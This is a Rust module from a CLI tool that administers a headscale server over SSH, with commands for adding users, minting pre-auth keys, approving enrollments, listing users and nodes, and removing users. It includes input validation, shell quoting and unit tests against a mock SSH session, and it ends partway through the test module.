//! `auberge headscale` — the slice of headscale's own CLI auberge drives over
//! ssh.
//!
//! Everything below the [`SshSession`] seam speaks headscale's *command line*,
//! and a command line is a contract with one release. [`VERIFIED_CLI_VERSION`]
//! names the release every command string and every JSON shape in this file was
//! read off, and `tests/headscale_cli_contract.rs` fails the build when the App
//! Version the Playbook Meta pins moves past it — because that is precisely how
//! this file broke: Renovate walked headscale 0.25 → 0.29 while `preauthkeys
//! create --user` changed from a username to a `uint` id, and nothing here
//! noticed (#707).

use crate::config::Config;
use crate::hosts::{HOST_FLAG, Host, HostManager, select_or_arg};
use crate::output;
use crate::output::OutputFormat;
use crate::prompt::{Choice, confirm, select_item};
use crate::services::ssh::{LiveSshSession, SshSession};
use clap::Subcommand;
use dialoguer::{Input, Select, theme::ColorfulTheme};
use eyre::{Context, Result};
use serde::{Deserialize, Serialize};
use std::io::IsTerminal;
use std::path::PathBuf;
use tabled::Tabled;

/// The headscale release this module's command lines and JSON shapes were read
/// off, and the version `ansible/playbooks/headscale.meta.yml` must pin.
///
/// Stated here rather than in the fence so the claim sits next to the code
/// making it: a reader who changes a command string below is looking at the
/// version it is true of.
pub const VERIFIED_CLI_VERSION: &str = "0.29.3";

#[derive(Subcommand)]
pub enum HeadscaleCommands {
    #[command(
        visible_alias = "au",
        about = "Create a user and generate a pre-auth key"
    )]
    AddUser {
        #[arg(help = "Username to create")]
        name: Option<String>,
        #[arg(short, long, help = "Pre-auth key expiration (e.g. 1h, 24h, 48h, 7d)")]
        expiration: Option<String>,
        #[arg(
            short,
            long,
            value_delimiter = ',',
            help = "ACL tags to stamp on the pre-auth key (e.g. tag:server)"
        )]
        tags: Vec<String>,
        #[arg(short = 'H', long, help = "Target host running headscale")]
        host: Option<String>,
    },
    #[command(
        visible_alias = "ak",
        about = "Mint a pre-auth key for an existing user"
    )]
    AddKey {
        #[arg(
            short,
            long,
            help = "Existing username (prompts from users list when omitted)"
        )]
        user: Option<String>,
        #[arg(short, long, help = "Pre-auth key expiration (e.g. 1h, 24h, 48h, 7d)")]
        expiration: Option<String>,
        #[arg(
            short,
            long,
            value_delimiter = ',',
            help = "ACL tags to stamp on the pre-auth key (e.g. tag:server)"
        )]
        tags: Vec<String>,
        #[arg(short = 'H', long, help = "Target host running headscale")]
        host: Option<String>,
    },
    #[command(
        visible_alias = "rg",
        about = "Approve a pending interactive enrollment"
    )]
    Register {
        #[arg(
            value_name = "URL_OR_AUTH_ID",
            help = "Register URL shown by the enrolling device, or the bare hskey-authreq-… id"
        )]
        auth: String,
        #[arg(
            short,
            long,
            help = "Existing username (prompts from users list when omitted)"
        )]
        user: Option<String>,
        #[arg(short = 'H', long, help = "Target host running headscale")]
        host: Option<String>,
    },
    #[command(visible_alias = "lu", about = "List registered users")]
    ListUsers {
        #[arg(
            short = 'o',
            long,
            value_enum,
            default_value = "human",
            help = "Output format"
        )]
        output: OutputFormat,
        #[arg(short = 'H', long, help = "Target host running headscale")]
        host: Option<String>,
    },
    #[command(visible_alias = "ln", about = "List connected nodes")]
    ListNodes {
        #[arg(
            short = 'o',
            long,
            value_enum,
            default_value = "human",
            help = "Output format"
        )]
        output: OutputFormat,
        #[arg(short = 'H', long, help = "Target host running headscale")]
        host: Option<String>,
    },
    #[command(visible_alias = "ru", about = "Remove a user")]
    RemoveUser {
        #[arg(help = "Username to remove")]
        name: Option<String>,
        #[arg(short, long, help = "Skip confirmation prompt")]
        yes: bool,
        #[arg(short = 'H', long, help = "Target host running headscale")]
        host: Option<String>,
    },
}

/// A headscale user, as its `-o json` renders one.
///
/// headscale serialises its protobuf types with Go's `encoding/json` over the
/// generated struct tags, not with protojson — so the keys are the *proto*
/// field names (`created_at`, not `createdAt`) and a `uint64` id is a JSON
/// number, not a string. Every generated tag carries `omitempty`, so a zero
/// value is an absent key rather than a zero one.
#[derive(Debug, Clone, Serialize, Deserialize)]
struct HeadscaleUser {
    id: u64,
    name: String,
    created_at: Option<ProtoTimestamp>,
}

/// A `google.protobuf.Timestamp`, which `encoding/json` renders as its two
/// numeric fields. Both are `omitempty`, and both zero values are reachable —
/// nanos routinely, seconds at the epoch itself.
#[derive(Debug, Clone, Serialize, Deserialize)]
struct ProtoTimestamp {
    #[serde(default)]
    seconds: i64,
    #[serde(default)]
    nanos: i32,
}

impl ProtoTimestamp {
    fn to_rfc3339(&self) -> String {
        chrono::DateTime::from_timestamp(self.seconds, self.nanos as u32)
            .map(|dt| dt.format("%Y-%m-%d %H:%M:%S UTC").to_string())
            .unwrap_or_else(|| format!("{}s", self.seconds))
    }
}

/// A headscale node. Field names are the proto ones for the reason
/// [`HeadscaleUser`] documents: the camelCase spellings this carried until
/// #707 are protojson's, and headscale does not use protojson — every node
/// listing failed to parse on `missing field givenName`.
#[derive(Debug, Serialize, Deserialize)]
struct HeadscaleNode {
    id: u64,
    given_name: String,
    #[serde(default)]
    ip_addresses: Vec<String>,
    user: HeadscaleNodeUser,
    last_seen: Option<ProtoTimestamp>,
    #[serde(default)]
    online: bool,
}

#[derive(Debug, Serialize, Deserialize)]
struct HeadscaleNodeUser {
    name: String,
}

/// The `preauthkeys create` response. Only the key itself is read; the object
/// also carries the owning user, an id, the expiration and the ACL tags.
#[derive(Debug, Deserialize)]
struct HeadscalePreAuthKey {
    key: String,
}

#[derive(Tabled)]
struct UserDisplay {
    #[tabled(rename = "ID")]
    id: String,
    #[tabled(rename = "NAME")]
    name: String,
    #[tabled(rename = "CREATED")]
    created_at: String,
}

impl From<&HeadscaleUser> for UserDisplay {
    fn from(u: &HeadscaleUser) -> Self {
        Self {
            id: u.id.to_string(),
            name: u.name.clone(),
            created_at: u
                .created_at
                .as_ref()
                .map(|t| t.to_rfc3339())
                .unwrap_or_default(),
        }
    }
}

#[derive(Tabled)]
struct NodeDisplay {
    #[tabled(rename = "ID")]
    id: String,
    #[tabled(rename = "NAME")]
    name: String,
    #[tabled(rename = "USER")]
    user: String,
    #[tabled(rename = "IPS")]
    ips: String,
    #[tabled(rename = "ONLINE")]
    online: String,
    #[tabled(rename = "LAST SEEN")]
    last_seen: String,
}

impl From<&HeadscaleNode> for NodeDisplay {
    fn from(n: &HeadscaleNode) -> Self {
        Self {
            id: n.id.to_string(),
            name: n.given_name.clone(),
            user: n.user.name.clone(),
            ips: n.ip_addresses.join(", "),
            online: if n.online {
                "yes".to_string()
            } else {
                "no".to_string()
            },
            last_seen: n
                .last_seen
                .as_ref()
                .map(|t| t.to_rfc3339())
                .unwrap_or_default(),
        }
    }
}

/// The only Host whose config answers the headscale serving gate
/// (ADR-0057), when exactly one does. Zero or several answers mean the
/// caller has to ask.
fn only_serving_host(hosts: &[Host], config: &Config) -> Option<Host> {
    let mut serving = hosts.iter().filter(|h| {
        config
            .get_for_host("headscale_subdomain", Some(&h.name))
            .is_some_and(|v| !v.trim().is_empty())
    });
    match (serving.next(), serving.next()) {
        (Some(only), None) => Some(only.clone()),
        _ => None,
    }
}

fn resolve_headscale_host(host_arg: Option<String>) -> Result<(Host, PathBuf)> {
    let host = match host_arg {
        Some(name) => HostManager::get_host(&name)?,
        None => {
            let config = Config::load()?;
            match only_serving_host(&HostManager::load_hosts()?, &config) {
                Some(host) => host,
                None => select_or_arg(None, HOST_FLAG)?,
            }
        }
    };

    let ssh_key = match &host.ssh_key {
        Some(key) => {
            let path = crate::services::ssh::configured_key_path(key);
            if !path.exists() {
                eyre::bail!("SSH key not found: {}", path.display());
            }
            path
        }
        None => {
            let path = crate::services::ssh::default_ssh_key_path(&host.user, &host.name)?;
            if !path.exists() {
                eyre::bail!(
                    "SSH key not found: {}\nRun 'auberge ssh keygen --host {} --user {}'",
                    path.display(),
                    host.name,
                    host.user
                );
            }
            path
        }
    };

    Ok((host, ssh_key))
}

fn validate_username(name: &str) -> Result<()> {
    if name.is_empty() {
        eyre::bail!("Username cannot be empty");
    }
    if !name
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
    {
        eyre::bail!("Username must contain only alphanumeric characters, hyphens, or underscores");
    }
    Ok(())
}

/// headscale's own `validateTag` — `tag:` prefix, lowercase, no spaces —
/// applied before the SSH round trip: on add-user a server-side rejection
/// would land after `users create` has already mutated the store, the
/// half-done state #707 was about. Two local tightenings on top of the
/// server's rule: a bare `tag:` (which 0.29.3 accepts) names nothing and can
/// only be a mistake, and a comma would be re-split by the remote cobra
/// `StringSlice` into tags nobody passed. The shell defense is [`quote`], not
/// this.
fn validate_tag(tag: &str) -> Result<()> {
    let Some(name) = tag.strip_prefix("tag:") else {
        eyre::bail!("Tag '{}' must start with 'tag:'", tag);
    };
    if name.is_empty() {
        eyre::bail!("Tag '{}' names nothing after 'tag:'", tag);
    }
    if tag.to_lowercase() != tag {
        eyre::bail!("Tag '{}' must be lowercase", tag);
    }
    if tag.chars().any(|c| c.is_whitespace()) {
        eyre::bail!("Tag '{}' must not contain whitespace", tag);
    }
    if tag.contains(',') {
        eyre::bail!("Tag '{}' must not contain commas", tag);
    }
    Ok(())
}

fn validate_tags(tags: &[String]) -> Result<()> {
    for tag in tags {
        validate_tag(tag)?;
    }
    Ok(())
}

fn validate_expiration(exp: &str) -> Result<()> {
    if !exp
        .chars()
        .all(|c| c.is_ascii_digit() || c == 'h' || c == 'd' || c == 'm' || c == 's')
    {
        eyre::bail!("Expiration must be a duration like 1h, 24h, 7d");
    }
    Ok(())
}

fn strip_ssh_banner(output: &str) -> &str {
    let trimmed = output.trim();
    if let Some(pos) = trimmed.rfind("****") {
        let after_banner = &trimmed[pos..];
        if let Some(newline) = after_banner.find('\n') {
            return after_banner[newline..].trim();
        }
    }
    trimmed
}

/// A `headscale` invocation that exited non-zero, carrying its stderr as a
/// field rather than only as rendered text.
///
/// A caller that wants to recognise one specific remote failure — `register`
/// is the only one, and only for the registration cache (#729) — reads
/// `stderr` off this through `err.chain()`, the way `is_retryable` reads a
/// status off `BichonApiHttpError`. Matching `Report::to_string()` instead
/// would match a *rendering*: it returns the outermost context only, so it
/// happens to carry the stderr solely because this `Display` inlines it, and
/// a later `wrap_err` anywhere below would end the coupling silently.
#[derive(Debug)]
struct HeadscaleCmdError {
    args: String,
    stderr: String,
}

impl std::fmt::Display for HeadscaleCmdError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        if self.stderr.is_empty() {
            write!(f, "headscale {} failed", self.args)
        } else {
            write!(f, "headscale {} failed: {}", self.args, self.stderr)
        }
    }
}

impl std::error::Error for HeadscaleCmdError {}

fn run_headscale_cmd(session: &dyn SshSession, args: &str) -> Result<String> {
    let cmd = format!("sudo headscale {}", args);
    let out = session.run(&cmd)?;
    if !out.success {
        return Err(HeadscaleCmdError {
            args: args.to_string(),
            stderr: strip_ssh_banner(&out.stderr_str()).to_string(),
        }
        .into());
    }
    Ok(strip_ssh_banner(&out.stdout_str()).to_string())
}

/// A value interpolated into a remote command line, quoted for the login shell
/// that will parse it ([`SshSession::run`]).
///
/// `validate_username` guards the names auberge is *given*, and cannot guard
/// the ones it is *told*: a name reaching `remove-user` through the picker
/// comes from headscale's own store, where an OIDC claim or `users rename` can
/// put anything. The guard was applied on one of the two paths, so the picker
/// handed an unchecked string to a `sudo` command line.
fn quote(value: &str) -> String {
    shell_escape::escape(value.into()).into_owned()
}

/// A headscale list, which is `null` rather than `[]` when it is empty:
/// `printListOutput` hands `encoding/json` a nil Go slice, and a nil slice
/// marshals to `null`. Both listings go through here so only one of them can
/// forget — `users list` was the one that had (#707).
fn parse_list<T: serde::de::DeserializeOwned>(raw: &str, what: &str) -> Result<Vec<T>> {
    let parsed: Option<Vec<T>> = serde_json::from_str(raw.trim())
        .wrap_err_with(|| format!("Failed to parse headscale {}", what))?;
    Ok(parsed.unwrap_or_default())
}

fn create_user(session: &dyn SshSession, username: &str) -> Result<HeadscaleUser> {
    let raw = run_headscale_cmd(
        session,
        &format!("users create {} -o json", quote(username)),
    )?;
    serde_json::from_str(raw.trim()).wrap_err("Failed to parse headscale users create response")
}

/// `preauthkeys create --user` takes the user's **ID**, a `uint`. Handing it
/// the username makes cobra reject the flag value — after `users create` has
/// already run, so the user exists and the enrollment instructions never print
/// (#707).
///
/// The id comes from the `users create` response, which carries the user it
/// just made, rather than from a second `users list` round trip: nothing can
/// then fail *between* the mutation and the key that mutation exists to mint.
fn mint_preauth_key(
    session: &dyn SshSession,
    user_id: u64,
    expiration: &str,
    tags: &[String],
) -> Result<String> {
    let tags_flag = if tags.is_empty() {
        String::new()
    } else {
        format!(" --tags {}", quote(&tags.join(",")))
    };
    let raw = run_headscale_cmd(
        session,
        &format!(
            "preauthkeys create --user {} --expiration {}{} -o json",
            user_id, expiration, tags_flag
        ),
    )?;
    let key: HeadscalePreAuthKey =
        serde_json::from_str(raw.trim()).wrap_err("Failed to parse pre-auth key response")?;
    Ok(key.key)
}

fn list_users(session: &dyn SshSession) -> Result<Vec<HeadscaleUser>> {
    parse_list(
        &run_headscale_cmd(session, "users list -o json")?,
        "users list",
    )
}

fn list_nodes(session: &dyn SshSession) -> Result<Vec<HeadscaleNode>> {
    parse_list(
        &run_headscale_cmd(session, "nodes list -o json")?,
        "nodes list",
    )
}

/// The auth-id out of what the enrolling device shows: the full register URL
/// (`https://hs.…/register/hskey-authreq-…` — a trailing slash, query string,
/// or fragment appended by a share sheet is tolerated) or the bare
/// `hskey-authreq-…` id. Anything else is rejected *here*, locally, before
/// an SSH round trip could carry it to a `sudo` command line — and the shape
/// this admits (prefix + the raw-URL-safe base64 alphabet headscale mints
/// ids from: ASCII alphanumerics, `-`, `_`) contains no shell metacharacter,
/// though [`quote`] still wraps it downstream.
fn parse_auth_id(input: &str) -> Result<String> {
    let trimmed = input.trim();
    let path = match trimmed.find(['?', '#']) {
        Some(i) => &trimmed[..i],
        None => trimmed,
    };
    let path = path.trim_end_matches('/');
    let candidate = match path.rfind('/') {
        Some(i) => &path[i + 1..],
        None => path,
    };
    let is_auth_id = candidate
        .strip_prefix("hskey-authreq-")
        .is_some_and(|suffix| {
            !suffix.is_empty()
                && suffix
                    .chars()
                    .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
        });
    if !is_auth_id {
        eyre::bail!(
            "'{}' is neither a register URL (https://…/register/hskey-authreq-…) \
             nor a bare hskey-authreq-… id",
            input
        );
    }
    Ok(candidate.to_string())
}

/// The miss headscale reports when the auth-id names no pending enrollment.
/// Matched as a substring: it arrives wrapped in gRPC framing
/// (`registering node: rpc error: code = Unknown desc = …`).
///
/// Prose, not a flag — so no `--help` shows it, and a reworded release would
/// end the translation with every test still green. It rides the same
/// [`VERIFIED_CLI_VERSION`] contract as the command lines, and
/// `tests/headscale_cli_contract.rs` names it among what to re-read when the
/// pin moves.
const REGISTRATION_CACHE_MISS: &str = "node not found in registration cache";

/// What that miss means, and what to do about it.
///
/// Like every command string in this file, the 15 minutes is a claim about
/// [`VERIFIED_CLI_VERSION`]: `registerCacheExpiration = time.Minute * 15` in
/// headscale's `hscontrol/state/state.go`, over an in-memory LRU — so a
/// restart empties it early, and the figure moves when that const does.
///
/// It does not say *expired*, though that is the usual cause: the same miss
/// answers an auth-id that was never issued, and [`parse_auth_id`] only
/// shape-checks. The remedy is the same either way, so the message leads with
/// it rather than with a cause auberge cannot tell apart.
const REGISTRATION_CACHE_MISS_REMEDY: &str = "No pending enrollment under this auth-id: \
     headscale holds one for 15 minutes and drops all of them when it restarts. Restart \
     the login on the device and re-run with the fresh link — the /register/ page keeps \
     serving after the enrollment is gone, so reloading it proves nothing";

/// `auth register` approves the pending interactive enrollment the auth-id
/// names. `--user` is a string on this subcommand in 0.29.3 — the
/// `preauthkeys create` uint trap (#707) does not apply (verified live during
/// the #712 flag day). Both interpolated values are text reaching a `sudo`
/// command line: the username comes from headscale's own store (the
/// `remove-user` lesson), the auth-id from a pasted URL, so both ride quoted.
///
/// One failure is translated here and nowhere else (#729). The registration
/// cache is this flow's alone, while [`run_headscale_cmd`] carries eight other
/// command lines, so the miss is recognised at the seam that knows what it
/// means. Everything else headscale says still reaches the operator as
/// headscale wrote it, under a wrapper rather than in place of one.
fn register_node(session: &dyn SshSession, auth_id: &str, username: &str) -> Result<String> {
    run_headscale_cmd(
        session,
        &format!(
            "auth register --auth-id {} --user {}",
            quote(auth_id),
            quote(username)
        ),
    )
    .map_err(|err| {
        let missed_the_cache = err
            .chain()
            .find_map(|cause| cause.downcast_ref::<HeadscaleCmdError>())
            .is_some_and(|failed| failed.stderr.contains(REGISTRATION_CACHE_MISS));
        if missed_the_cache {
            err.wrap_err(REGISTRATION_CACHE_MISS_REMEDY)
        } else {
            err
        }
    })
}

/// `users destroy` still resolves a user by `--name` on 0.29.3, unlike
/// `preauthkeys create`; `--force` is the global flag that answers its
/// confirmation prompt.
fn destroy_user(session: &dyn SshSession, username: &str) -> Result<()> {
    run_headscale_cmd(
        session,
        &format!("users destroy --name {} --force", quote(username)),
    )?;
    Ok(())
}

/// The expiration for a key about to be minted: the flag when given, a picker
/// on a terminal, `24h` otherwise.
fn resolve_expiration(expiration: Option<String>, is_tty: bool) -> Result<String> {
    match expiration {
        Some(e) => Ok(e),
        None if is_tty => {
            let options = vec!["1h", "24h", "48h", "7d"];
            let selection = Select::with_theme(&ColorfulTheme::default())
                .with_prompt("Key expiration")
                .items(&options)
                .default(1)
                .interact()?;
            Ok(options[selection].to_string())
        }
        None => Ok("24h".to_string()),
    }
}

/// The enrollment hand-off every minted key ends in: the bare key on stdout so
/// a script can capture it, the shareable instructions on stderr.
fn print_enrollment_instructions(key: &str) -> Result<()> {
    let config = Config::load()?;
    let subdomain = config
        .get("headscale_subdomain")
        .unwrap_or_else(|| "hs".to_string());
    let domain = config
        .get("domain")
        .unwrap_or_else(|| "example.com".to_string());
    let login_server = format!("https://{}.{}", subdomain, domain);

    println!("{}", key);

    eprintln!();
    eprintln!("Share these instructions:");
    eprintln!("─────────────────────────────────────");
    eprintln!("1. Install Tailscale (App Store / Play Store / tailscale.com)");
    eprintln!("2. Set custom control server to: {}", login_server);
    eprintln!("   iOS: long-press ⋯ menu before signing in");
    eprintln!("   Android: top menu > Use another server");
    eprintln!("   CLI: tailscale up --login-server {}", login_server);
    eprintln!("3. Use pre-auth key: {}", key);
    eprintln!(
        "   CLI: tailscale up --login-server {} --authkey {}",
        login_server, key
    );
    eprintln!("─────────────────────────────────────");
    Ok(())
}

/// The whole enrollment mutation, as the one remote sequence it is.
///
/// The step that broke was not either call but the value threaded *between*
/// them, so the threading is what has to be reachable from a test: the entry
/// point below builds its own `LiveSshSession` and can never be one (ADR-0047).
/// `mint_preauth_key`'s `u64` already makes the original regression a type
/// error; this makes it a test failure as well, including for a future
/// signature that stopped being a `u64`.
fn add_user(
    session: &dyn SshSession,
    username: &str,
    expiration: &str,
    tags: &[String],
) -> Result<(HeadscaleUser, String)> {
    output::info(&format!("Creating user '{}'...", username));
    let user = create_user(session, username)?;
    output::success(&format!("User '{}' created (id {})", user.name, user.id));

    output::info("Generating pre-auth key...");
    let key = mint_preauth_key(session, user.id, expiration, tags)?;
    Ok((user, key))
}

/// Resolves a username against `users list` — *locally*: the name reaches no
/// command line, so unlike `remove-user` it needs neither
/// [`validate_username`] nor [`quote`]. Only the listing's `u64` id is ever
/// interpolated, which is #707's lesson carried by the type.
fn find_user(session: &dyn SshSession, username: &str) -> Result<HeadscaleUser> {
    list_users(session)?
        .into_iter()
        .find(|u| u.name == username)
        .ok_or_else(|| {
            eyre::eyre!(
                "No headscale user named '{}' — `auberge headscale add-user` creates one",
                username
            )
        })
}

/// A user that must already exist, resolved against one `users list`: a name
/// given via `--user` is matched locally ([`find_user`]), an omitted one goes
/// through the picker over that same listing. What of the resolved user then
/// reaches a command line is each caller's contract: add-key interpolates the
/// `u64` id (#707's lesson), register the name (`auth register --user` takes
/// a string on 0.29.3).
fn resolve_existing_user(
    session: &dyn SshSession,
    user: Option<String>,
    is_tty: bool,
    prompt: &str,
) -> Result<HeadscaleUser> {
    match user {
        Some(name) => find_user(session, &name),
        None if is_tty => {
            let users = list_users(session)?;
            select_item(
                &users,
                |u| format!("{} (id: {})", u.name, u.id),
                Choice::new("user")
                    .with_prompt(prompt)
                    .resolved_by("--user <name>")
                    .populated_by("auberge headscale add-user"),
            )
        }
        None => eyre::bail!("Username is required (pass --user or run interactively)"),
    }
}

/// A key for a user that already exists, which is what `add-user` refuses
/// (#711) — the second and third device under the one #510 user had no CLI
/// path.
pub fn run_headscale_add_key(
    user: Option<String>,
    expiration: Option<String>,
    tags: Vec<String>,
    host: Option<String>,
) -> Result<()> {
    let (host_info, ssh_key) = resolve_headscale_host(host)?;
    let session = LiveSshSession::new(&host_info, &ssh_key);

    let is_tty = std::io::stdin().is_terminal();

    // The picker's displayed id is the minted id — no second round trip for
    // a rename to slip between the listing and the mint.
    let user = resolve_existing_user(&session, user, is_tty, "Select user to mint a key for")?;

    let exp = resolve_expiration(expiration, is_tty)?;
    validate_expiration(&exp)?;
    validate_tags(&tags)?;

    output::info(&format!(
        "Generating pre-auth key for '{}' (id {})...",
        user.name, user.id
    ));
    let key = mint_preauth_key(&session, user.id, &exp, &tags)?;

    print_enrollment_instructions(&key)?;

    output::success("Done");
    Ok(())
}

/// Approves the pending interactive enrollment a device is waiting on — the
/// flow (Android app, or `tailscale up` without `--authkey`) that ends at a
/// browser page instructing `headscale auth register --auth-id … --user …`,
/// which until #724 meant hand-copying the auth-id into an ssh one-liner.
///
/// The auth-id is parsed and shape-checked before anything touches the
/// network; user resolution shares add-key's ([`resolve_existing_user`]) —
/// but what reaches the command line here is the *name*, not the listed id:
/// `auth register --user` takes a string on 0.29.3, so headscale re-resolves
/// it remotely, and a rename landing between the listing and the register is
/// not closed out the way add-key's id-threading closes it.
pub fn run_headscale_register(
    auth: String,
    user: Option<String>,
    host: Option<String>,
) -> Result<()> {
    let auth_id = parse_auth_id(&auth)?;

    let (host_info, ssh_key) = resolve_headscale_host(host)?;
    let session = LiveSshSession::new(&host_info, &ssh_key);

    let is_tty = std::io::stdin().is_terminal();

    let user = resolve_existing_user(
        &session,
        user,
        is_tty,
        "Select user to register the node under",
    )?;

    output::info(&format!("Registering {} under '{}'...", auth_id, user.name));
    let response = register_node(&session, &auth_id, &user.name)?;
    if !response.is_empty() {
        println!("{}", response);
    }
    output::success(&format!("Node registered under '{}'", user.name));
    Ok(())
}

pub fn run_headscale_add_user(
    name: Option<String>,
    expiration: Option<String>,
    tags: Vec<String>,
    host: Option<String>,
) -> Result<()> {
    let (host_info, ssh_key) = resolve_headscale_host(host)?;
    let session = LiveSshSession::new(&host_info, &ssh_key);

    let is_tty = std::io::stdin().is_terminal();

    let username = match name {
        Some(n) => n,
        None if is_tty => Input::<String>::with_theme(&ColorfulTheme::default())
            .with_prompt("Username")
            .interact_text()?,
        None => eyre::bail!("Username is required (pass as argument or run interactively)"),
    };

    let exp = resolve_expiration(expiration, is_tty)?;

    validate_username(&username)?;
    validate_expiration(&exp)?;
    validate_tags(&tags)?;

    let (_user, key) = add_user(&session, &username, &exp, &tags)?;

    print_enrollment_instructions(&key)?;

    output::success("Done");
    Ok(())
}

pub fn run_headscale_list_users(output_fmt: OutputFormat, host: Option<String>) -> Result<()> {
    let (host_info, ssh_key) = resolve_headscale_host(host)?;
    let session = LiveSshSession::new(&host_info, &ssh_key);

    let users = list_users(&session)?;

    match output_fmt {
        OutputFormat::Json => {
            println!("{}", serde_json::to_string_pretty(&users)?);
        }
        OutputFormat::Human => {
            if users.is_empty() {
                output::info("No users found");
                return Ok(());
            }
            let display: Vec<UserDisplay> = users.iter().map(UserDisplay::from).collect();
            output::print_table(&display);
        }
    }
    Ok(())
}

pub fn run_headscale_list_nodes(output_fmt: OutputFormat, host: Option<String>) -> Result<()> {
    let (host_info, ssh_key) = resolve_headscale_host(host)?;
    let session = LiveSshSession::new(&host_info, &ssh_key);

    let nodes = list_nodes(&session)?;

    match output_fmt {
        OutputFormat::Json => {
            println!("{}", serde_json::to_string_pretty(&nodes)?);
        }
        OutputFormat::Human => {
            if nodes.is_empty() {
                output::info("No nodes found");
                return Ok(());
            }
            let display: Vec<NodeDisplay> = nodes.iter().map(NodeDisplay::from).collect();
            output::print_table(&display);
        }
    }
    Ok(())
}

pub fn run_headscale_remove_user(
    name: Option<String>,
    yes: bool,
    host: Option<String>,
) -> Result<()> {
    if yes && name.is_none() {
        eyre::bail!("--yes requires a username argument");
    }

    let (host_info, ssh_key) = resolve_headscale_host(host)?;
    let session = LiveSshSession::new(&host_info, &ssh_key);

    let is_tty = std::io::stdin().is_terminal();

    let username = match name {
        Some(n) => {
            validate_username(&n)?;
            n
        }
        None if is_tty => {
            let users = list_users(&session)?;
            if users.is_empty() {
                eyre::bail!("No users to remove");
            }
            let selected = select_item(
                &users,
                |u| format!("{} (id: {})", u.name, u.id),
                Choice::new("user")
                    .with_prompt("Select user to remove")
                    .resolved_by("the username as an argument"),
            )?;
            selected.name.clone()
        }
        None => eyre::bail!("Username is required (pass as argument or run interactively)"),
    };

    if !confirm(&format!("Remove user '{}'?", username), yes) {
        output::info("Cancelled");
        return Ok(());
    }

    destroy_user(&session, &username)?;
    output::success(&format!("User '{}' removed", username));
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::services::ssh::{CommandResult, MockSshSession, SshOp};

    #[test]
    fn headscale_cmd_prefixes_sudo_headscale() {
        let mock = MockSshSession::new();
        run_headscale_cmd(&mock, "users list -o json").unwrap();
        assert_eq!(
            mock.calls(),
            vec![SshOp::Run("sudo headscale users list -o json".to_string())]
        );
    }

    #[test]
    fn headscale_cmd_strips_the_login_banner_from_stdout() {
        let mock = MockSshSession::new();
        mock.stage_run_result(CommandResult {
            success: true,
            exit_code: Some(0),
            stdout: b"**** Authorized uses only ****\n[]".to_vec(),
            stderr: Vec::new(),
        });
        assert_eq!(
            run_headscale_cmd(&mock, "users list -o json").unwrap(),
            "[]"
        );
    }

    #[test]
    fn headscale_cmd_reports_the_remote_stderr_on_failure() {
        let mock = MockSshSession::new();
        mock.stage_run_result(CommandResult {
            success: false,
            exit_code: Some(1),
            stdout: Vec::new(),
            stderr: b"user \"ghost\" not found".to_vec(),
        });
        let err = run_headscale_cmd(&mock, "users destroy ghost").unwrap_err();
        assert_eq!(
            err.to_string(),
            "headscale users destroy ghost failed: user \"ghost\" not found"
        );
    }

    #[test]
    fn headscale_cmd_names_the_subcommand_when_the_remote_says_nothing() {
        let mock = MockSshSession::new();
        mock.stage_run_result(CommandResult {
            success: false,
            exit_code: Some(1),
            stdout: Vec::new(),
            stderr: Vec::new(),
        });
        let err = run_headscale_cmd(&mock, "nodes list").unwrap_err();
        assert_eq!(err.to_string(), "headscale nodes list failed");
    }

    /// What `headscale users list -o json` prints on 0.29.3: proto field names,
    /// a numeric id, and `omitempty` dropping the zero `nanos`.
    const USERS_LIST_JSON: &str = r#"[
	{
		"id": 1,
		"name": "alice",
		"created_at": {
			"seconds": 1735689600
		}
	},
	{
		"id": 2,
		"name": "bob",
		"created_at": {
			"seconds": 1738368000
		}
	}
]"#;

    /// What `headscale nodes list -o json` prints on 0.29.3. The user is the
    /// full `User` message, not a bare name, and `online: false` would be
    /// absent rather than `false`.
    const NODES_LIST_JSON: &str = r#"[
	{
		"id": 1,
		"machine_key": "mkey:aa",
		"node_key": "nodekey:bb",
		"ip_addresses": [
			"100.64.0.1",
			"fd7a:115c:a1e0::1"
		],
		"name": "phone",
		"user": {
			"id": 1,
			"name": "alice",
			"created_at": {
				"seconds": 1735689600
			}
		},
		"last_seen": {
			"seconds": 1712919600
		},
		"created_at": {
			"seconds": 1712919000
		},
		"register_method": 2,
		"given_name": "phone",
		"online": true
	}
]"#;

    /// What `headscale users create <name> -o json` prints on 0.29.3: the one
    /// `User` it just made, id included.
    const USER_CREATED_JSON: &str = r#"{
	"id": 7,
	"name": "sripwoud",
	"created_at": {
		"seconds": 1776019755
	}
}"#;

    /// What `headscale preauthkeys create -o json` prints on 0.29.3.
    const PREAUTHKEY_JSON: &str = r#"{
	"user": {
		"id": 7,
		"name": "sripwoud",
		"created_at": {
			"seconds": 1776019755
		}
	},
	"id": 1,
	"key": "abcdef123456",
	"expiration": {
		"seconds": 1776023355
	},
	"created_at": {
		"seconds": 1776019755
	}
}"#;

    #[test]
    fn list_users_reads_the_shape_0_29_3_prints() {
        let mock = MockSshSession::new();
        mock.stage_run_result(CommandResult::from_stdout(USERS_LIST_JSON));
        let users = list_users(&mock).unwrap();
        assert_eq!(users.len(), 2);
        assert_eq!(users[0].name, "alice");
        assert_eq!(users[1].id, 2);
        assert_eq!(
            mock.calls(),
            vec![SshOp::Run("sudo headscale users list -o json".to_string())]
        );
    }

    /// `printListOutput` marshals a nil Go slice, so an empty listing is `null`
    /// — `users list` used to fail to parse it, which made every interactive
    /// `remove-user` on a fresh instance an error instead of "no users" (#707).
    #[test]
    fn list_users_reads_an_empty_listing_as_no_users() {
        let mock = MockSshSession::new();
        mock.stage_run_result(CommandResult::from_stdout("null\n"));
        assert!(list_users(&mock).unwrap().is_empty());
    }

    #[test]
    fn list_nodes_reads_the_shape_0_29_3_prints() {
        let mock = MockSshSession::new();
        mock.stage_run_result(CommandResult::from_stdout(NODES_LIST_JSON));
        let nodes = list_nodes(&mock).unwrap();
        assert_eq!(nodes.len(), 1);
        assert_eq!(nodes[0].given_name, "phone");
        assert_eq!(nodes[0].user.name, "alice");
        assert_eq!(nodes[0].ip_addresses.len(), 2);
        assert!(nodes[0].online);
        assert_eq!(
            mock.calls(),
            vec![SshOp::Run("sudo headscale nodes list -o json".to_string())]
        );
    }

    #[test]
    fn list_nodes_reads_an_empty_listing_as_no_nodes() {
        let mock = MockSshSession::new();
        mock.stage_run_result(CommandResult::from_stdout("null\n"));
